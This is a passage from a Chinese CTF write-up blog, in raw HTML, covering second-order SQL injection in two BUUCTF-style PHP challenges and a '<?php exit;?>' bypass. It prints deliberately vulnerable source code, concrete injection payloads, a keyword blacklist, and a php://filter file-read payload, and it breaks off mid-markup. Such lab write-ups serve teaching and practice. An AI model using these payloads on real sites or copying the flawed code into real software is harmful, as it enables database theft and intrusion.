class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描</p>\n<p>最后还原出的源码是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//write_do.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                title = &#x27;<span class=\"subst\">$title</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./comment.php?id=<span class=\"subst\">$bo_id</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board set category = &#x27;<span class=\"subst\">$category</span>&#x27;, title = &#x27;<span class=\"subst\">$title</span>&#x27;,content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"comment\">//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];    <span class=\"comment\"># 注意这行，在从数据库中取出数据时没有过滤，存在二次注入</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">        set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中</p>\n<p>这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \\ 并不会插入数据库</p>\n<p>接下来构造注入语句：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png\" alt=\"image-20221023180732878\"></p>\n<blockquote>\n<p>这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误</p>\n<p>在覆盖的同时，我们的注入语句也在自己写的 content 中</p>\n<p>最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了</p>\n<p>最后的语句为：</p>\n<p>insert into board set category = ‘a\\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;</p>\n<p>此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png\" alt=\"image-20221023181703773\"></p>\n<p>接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库</p>\n<blockquote>\n<p>category 取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了</p>\n<p>然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉</p>\n<p>最后语句变为了</p>\n<p>sql =` \"insert into comment set category = 'a',content=database(),/*', content = '*/#', bo_id = 'bo_id’&quot;;`</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png\" alt=\"image-20221023181848314\"></p>\n<p>得到库名，下面的 getflag 操作不在赘述</p>\n<h6 id=\"2ciscn2019-华北赛区-day1-web5cyberpunk\"><a class=\"markdownIt-Anchor\" href=\"#2ciscn2019-华北赛区-day1-web5cyberpunk\">#</a> 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk</h6>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，</p>\n<p>在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//confirm.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//var_dump($_POST);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"variable\">$user_name</span>.<span class=\"string\">&quot;已提交订单&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;sss&quot;</span>, <span class=\"variable\">$user_name</span>, <span class=\"variable\">$address</span>, <span class=\"variable\">$phone</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$re</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单提交成功&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，</p>\n<p>但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//change.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$fetch</span>) &amp;&amp; <span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$fetch</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class=\"variable\">$address</span>.<span class=\"string\">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;address&#x27;</span>].<span class=\"string\">&quot;&#x27; where `user_id`=&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;user_id&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单修改成功&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;未找到订单!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;信息不全&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因此我们在 confirm.php 插入数据库中时，提交注入语句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png\" alt=\"image-20221023190851989\"></p>\n<p>在修改地址时二次引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png\" alt=\"image-20221023190938216\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png\" alt=\"image-20221023190949077\"></p>\n<p>因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<p>然后接下来带来一些花活：</p>\n<h6 id=\"php-exit-绕过\"><a class=\"markdownIt-Anchor\" href=\"#php-exit-绕过\">#</a>  <code>&lt;?php exit; ?&gt;</code>  绕过</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class=\"line\">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class=\"line\">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure>\n<p>$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>是可以控制协议的，我们即可使用</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>协议</mtext><mo separator=\"true\">,</mo><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>流的</mtext><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mo>−</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mtext>方法，将</mtext></mrow><annotation encoding=\"application/x-tex\">_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将</annotation></semantics></math></span><span 